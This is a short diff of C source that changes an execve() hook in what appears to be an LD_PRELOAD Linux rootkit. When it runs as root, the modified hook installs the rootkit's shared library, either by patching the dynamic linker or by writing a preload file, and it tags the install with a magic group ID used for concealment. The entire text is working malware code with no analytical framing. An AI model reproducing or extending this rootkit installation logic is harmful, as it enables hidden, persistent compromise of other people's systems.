@@ -1,6 +1,17 @@
 int execve(const char *filename, char *const argv[], char *const envp[]){
-    if(!notuser(0) && rknomore() && !preloadok() && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
-        bdvinstall(argv);
+    if(!notuser(0) && rknomore(INSTALL_DIR, BDVLSO) && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME)){
+#ifdef PATCH_DYNAMIC_LINKER
+        if(!preloadok(PRELOAD_FILE)){
+            bdvinstall(argv, INSTALL_DIR, BDVLSO, PRELOAD_FILE, MAGIC_GID);
+            exit(0);
+        }
+#else
+        if(!preloadok(OLD_PRELOAD)){
+            bdvinstall(argv, INSTALL_DIR, BDVLSO, OLD_PRELOAD, MAGIC_GID);
+            exit(0);
+        }
+#endif
+    }
 
     plsdomefirst();
 
